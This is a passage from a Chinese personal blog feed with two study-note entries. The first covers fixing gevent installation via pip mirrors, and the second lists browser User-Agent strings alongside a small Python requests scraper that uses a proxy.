pip源更换</h3><p>这样就能解决被墙导致的装不上库的烦恼。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">豆瓣：http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">    清华：https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure></div><p>通过使用清华源 的确下载速度快了不少</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple gevent</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" class="lazyload"></a></p><p>但还是安装不上，然后我直接从源下载了 <code>gevent</code> 包<br>发现<code>gevent 1.4.0</code> 的版本只支持<code>python 3.7</code>的版本，我的是<code>python3.8</code> 32位的</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" class="lazyload"></a></p><p><strong>一定要注意版本！ 注意版本！ 注意版本！</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" class="lazyload"></a></p><p>然后网上找到了适合3.8版本的 <code>gevent-1.5a3-cp38-cp38-win32.whl</code></p><p>然后经过漫长的等待安装，终于好了</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" class="lazyload"></a></p><p>然后尝试跑一遍，可行，就很舒服</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" class="lazyload"></a></p><hr><h1 id="依赖包问题"><a href="#依赖包问题" class="headerlink" title="依赖包问题"></a>依赖包问题</h1><p>然后除了上述问题之外，还存在其他依赖包问题<br>如果要用 <code>gevent</code> 做网络工程<br>需要添加其他依赖包</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple greenlet</span><br><span class="line"></span><br><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple libevent</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近找到个 &lt;code&gt;TPscan&lt;/code&gt; 的脚本工具，但是依赖库缺失&lt;br&gt;按着百度的方法试了一大堆都不行，然后自己找点其他的办法来解决&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
  </entry>
  
  <entry>
    <title>User-Agent 大全</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/05/User_agent/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/05/User_agent/</id>
    <published>2020-02-05T12:52:55.402Z</published>
    <updated>2020-02-05T04:50:29.431Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>百度整理的(copy 雾)</p><a id="more"></a><h1 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Opera</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60</span><br><span class="line">Opera/8.0 (Windows NT 5.1; U; en)</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50</span><br><span class="line"></span><br><span class="line"><span class="attribute">Firefox</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0</span><br><span class="line">Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10</span><br><span class="line"></span><br><span class="line"><span class="attribute">Safari</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2</span><br><span class="line"></span><br><span class="line"><span class="attribute">chrome</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36</span><br><span class="line">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16</span><br><span class="line"></span><br><span class="line"><span class="attribute">360</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">淘宝浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11</span><br><span class="line"></span><br><span class="line">猎豹浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span><br><span class="line"></span><br><span class="line"><span class="attribute">QQ浏览器</span></span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)</span><br><span class="line"></span><br><span class="line"><span class="attribute">sogou浏览器</span></span><br><span class="line">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class="line"></span><br><span class="line"><span class="attribute">maxthon浏览器</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">UC浏览器</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36</span><br></pre></td></tr></table></figure></div><hr><h1 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">IPhone</span></span><br><span class="line">Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">IPod</span></span><br><span class="line">Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">IPAD</span></span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5</span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">Android</span></span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">QQ浏览器 Android版本</span><br><span class="line">MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">Android Opera Mobile</span><br><span class="line">Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10</span><br><span class="line"></span><br><span class="line">Android Pad Moto Xoom</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"></span><br><span class="line"><span class="attribute">BlackBerry</span></span><br><span class="line">Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+</span><br><span class="line"></span><br><span class="line">WebOS HP Touchpad</span><br><span class="line">Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0</span><br><span class="line"></span><br><span class="line">Nokia N97</span><br><span class="line">Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124</span><br><span class="line"></span><br><span class="line">Windows Phone Mango</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)</span><br><span class="line"></span><br><span class="line"><span class="attribute">UC浏览器</span></span><br><span class="line"><span class="attribute">UCWEB7.0.2.37/28/999</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">NOKIA5700/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCOpenwave</span></span><br><span class="line">Openwave/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line">UC Opera</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999</span><br></pre></td></tr></table></figure></div><hr><h1 id="Python3-中的爬虫"><a href="#Python3-中的爬虫" class="headerlink" title="Python3 中的爬虫"></a>Python3 中的爬虫</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    url=<span class="string">u"https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711?fr=aladdin"</span></span><br><span class="line">    user_agent=<span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span></span><br><span class="line">    header=&#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    proxies=&#123;<span class="string">"http"</span>:<span class="string">"http://125.120.11.219:6666"</span>&#125;</span><br><span class="line">    response=requests.get(url,headers=header,proxies=proxies)</span><br><span class="line">    <span class="keyword">print</span> (response.text)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;百度整理的(copy 雾)&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
  </entry>
  
</feed>
